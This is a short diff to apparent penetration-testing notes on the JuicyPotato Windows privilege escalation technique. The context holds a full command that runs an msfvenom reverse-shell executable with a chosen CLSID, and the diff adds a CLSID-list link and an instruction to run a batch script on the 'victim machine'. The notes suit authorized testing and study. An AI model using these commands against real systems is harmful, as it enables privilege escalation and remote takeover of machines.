@@ -1312,9 +1312,9 @@ Never touch a potato when it's hot :P
 	JuicyPotato.exe -l 1337 -p C:\Users\Public\Downloads\shell.exe -t * -c {CD5096A1-E7E7-4E09-8B12-CBF2790A87CF}
 		Where shell.exe is msfvenom generated reverse shell
 		where {1BE1F766-5536-11D1-B726-00C04FB926AF} is CLSID value which is different for different os
-		u can use below test_clsid.bat file to check varius matching CLSID with CLSID.list which can be found here: 
+		u can use below test_clsid.bat file to check varius matching CLSID with CLSID.list which can be found here: https://github.com/ohpe/juicy-potato/tree/master/CLSID
 
-Test_clsid.bat
+Test_clsid.bat (run this file on victim machine to get CLSID value)
 ---------------
 @echo off
 :: Starting port, you can change it
